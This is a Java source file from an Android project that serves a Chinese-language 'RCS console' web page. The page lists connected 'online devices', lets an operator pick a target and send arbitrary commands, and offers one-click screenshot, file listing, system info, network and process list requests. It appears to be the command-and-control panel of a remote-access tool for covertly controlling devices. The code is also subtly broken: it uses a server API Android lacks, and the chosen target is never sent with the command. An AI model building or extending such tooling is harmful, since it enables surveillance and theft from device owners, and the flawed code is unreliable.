package com.mycompany.myapp3;

import android.content.Context;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

public class SimpleHttpServer {
    private HttpServer server;

    public SimpleHttpServer(int port, Context context) {
        try {
            server = HttpServer.create(new InetSocketAddress(port), 0);
            server.createContext("/", new RootHandler());
            server.setExecutor(null);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void start() {
        server.start();
    }

    public void stop() {
        server.stop(0);
    }

    class RootHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>RCS控制台</title>"
                    + "<style>body{background:#0b0e14;color:#fff;font-family:system-ui;padding:20px}"
                    + ".card{background:#1a1d27;padding:16px;border-radius:12px;margin-bottom:16px}"
                    + ".flex{display:flex;gap:10px;flex-wrap:wrap}input,select,button{padding:8px 14px;border-radius:8px;border:none;background:#0b0e14;color:#fff}button{background:#3b82f6;cursor:pointer}"
                    + ".result{background:#0b0e14;padding:12px;border-radius:8px;font-family:monospace;white-space:pre-wrap;max-height:300px;overflow:auto}</style>"
                    + "</head><body><h2>🛸 RCS 控制台</h2>"
                    + "<div class='card'><strong>在线设备:</strong> <span id='count'>0</span><div id='clients'></div></div>"
                    + "<div class='card'><div class='flex'>"
                    + "<select id='target'><option value=''>选择目标</option></select>"
                    + "<input id='cmd' placeholder='命令...' style='flex:1'>"
                    + "<button onclick='sendCmd()'>执行</button>"
                    + "</div><div class='flex'>"
                    + "<button onclick='quick(\"screenshot\")'>📷截图</button>"
                    + "<button onclick='quick(\"filelist\")'>📂文件列表</button>"
                    + "<button onclick='quick(\"sysinfo\")'>💻系统信息</button>"
                    + "<button onclick='quick(\"netstat\")'>📡网络</button>"
                    + "<button onclick='quick(\"processlist\")'>🔄进程</button>"
                    + "</div></div>"
                    + "<div class='card'><strong>结果</strong><div id='result' class='result'>等待命令...</div></div>"
                    + "<script>"
                    + "let ws=null;function connectWS(){const p='ws://'+location.hostname+':8081';ws=new WebSocket(p);ws.onmessage=e=>{try{const d=JSON.parse(e.data);document.getElementById('result').textContent=JSON.stringify(d,null,2)}catch(err){document.getElementById('result').textContent=e.data}};ws.onclose=()=>setTimeout(connectWS,3000)}connectWS();"
                    + "function sendCmd(){const target=document.getElementById('target').value;const cmd=document.getElementById('cmd').value;if(!target||!cmd)return alert('选择目标并输入命令');ws.send(JSON.stringify({cmd:cmd,params:{}}))}"
                    + "function quick(c){document.getElementById('cmd').value=c;sendCmd()}"
                    + "function refreshClients(){fetch('/api/clients').then(r=>r.json()).then(data=>{const sel=document.getElementById('target');const container=document.getElementById('clients');const cnt=Object.keys(data).length;document.getElementById('count').textContent=cnt;sel.innerHTML='<option value=\"\">选择目标</option>';container.innerHTML='';for(const[id,info]of Object.entries(data)){const opt=document.createElement('option');opt.value=id;opt.textContent=id;sel.appendChild(opt);const div=document.createElement('div');div.innerHTML='<span>'+id+'</span><span style=\"color:#22c55e\"> ● 在线</span>';container.appendChild(div)}})}"
                    + "refreshClients();setInterval(refreshClients,5000);"
                    + "</script></body></html>";
            exchange.getResponseHeaders().set("Content-Type", "text/html; charset=UTF-8");
            exchange.sendResponseHeaders(200, html.getBytes().length);
            OutputStream os = exchange.getResponseBody();
            os.write(html.getBytes());
            os.close();
        }
    }
}
